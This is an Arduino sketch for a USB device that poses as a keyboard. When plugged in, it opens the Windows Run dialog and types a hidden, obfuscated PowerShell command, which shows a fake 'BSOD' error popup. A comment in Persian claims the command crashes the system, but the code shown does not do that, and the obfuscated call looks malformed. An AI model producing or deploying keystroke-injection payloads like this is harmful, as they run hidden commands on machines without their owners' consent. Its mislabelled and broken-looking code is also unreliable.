#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  // استفاده از دستور Native PowerShell برای Crash سیستم
  Keyboard.println("powershell -w hidden { & (\"{0}{1}\"-f 'C','md') (New-Object -ComObject WScript.Shell).Popup('BSOD Fake!',0,'Error',16) }");
}

void loop() {}
